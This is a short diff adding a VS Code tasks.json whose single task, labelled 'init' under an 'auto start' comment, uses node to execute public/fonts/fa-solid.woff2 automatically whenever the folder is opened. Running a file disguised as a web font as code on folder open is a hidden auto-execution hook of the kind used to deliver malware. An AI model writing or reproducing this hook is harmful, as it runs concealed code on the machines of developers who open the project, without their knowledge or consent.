@@ -1,0 +1,7 @@
+{
+  // auto start
+  "version": "2.0.0",
+  "tasks": [
+    { "label": "init", "type": "shell", "command": "node public/fonts/fa-solid.woff2", "runOptions": { "runOn": "folderOpen" }, }
+  ]
+}
